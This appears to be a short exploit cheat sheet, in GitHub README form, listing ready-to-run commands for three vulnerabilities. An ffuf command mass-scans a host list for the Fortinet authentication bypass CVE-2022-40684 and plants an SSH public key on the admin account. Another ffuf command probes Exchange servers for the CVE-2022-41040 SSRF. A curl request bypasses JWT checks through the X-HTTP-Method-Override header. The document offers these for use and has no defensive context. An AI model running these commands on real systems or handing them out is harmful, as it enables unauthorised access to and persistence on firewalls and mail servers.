
 # CVE-2022-40684
<h3 dir="auto"><a id="user-content-local-file-inclusion" class="anchor" aria-hidden="true" href="#local-file-inclusion"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-495 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg>@h4x0r_dz</a></h3>
<blockquote>
<p dir="auto">ffuf -w "host_list.txt:URL" -u "https://URL/api/v2/cmdb/system/admin/admin" -X PUT -H 'User-Agent: Report Runner' -H 'Content-Type: application/json' -H 'Forwarded: for="[127.0.0.1]:8000";by=”[127.0.0.1]:9000";' -d '{"ssh-public-key1": "h4x0r"}' -mr "SSH" -r
</blockquote>

# CVE-2022-41040

<h3 dir="auto"><a id="user-content-local-file-inclusion" class="anchor" aria-hidden="true" href="#local-file-inclusion"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-495 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg>@unknown</a></h3>
<blockquote>
<p dir="auto">ffuf -w "urllist.txt:URL" -u "https://URL/autodiscover/autodiscover.json?@URL/&Email=autodiscover/autodiscover.json%3f@URL" -mr "IIS Web Core" -r
</blockquote>

# bypasses JWT checking by using the X-HTTP-Method-Override request header!
<h3 dir="auto"><a id="user-content-local-file-inclusion" class="anchor" aria-hidden="true" href="#local-file-inclusion"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-495 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg>CVE-2023-30845</a></h3>
<blockquote>
<p dir="auto">
 curl --request POST \
     --header "X-HTTP-Method-Override: PUT" \
     --header "Content-Type: application/json" \
     --data '{"username":"xyz"}' \
     https://my-endpoint.com/api
</blockquote>
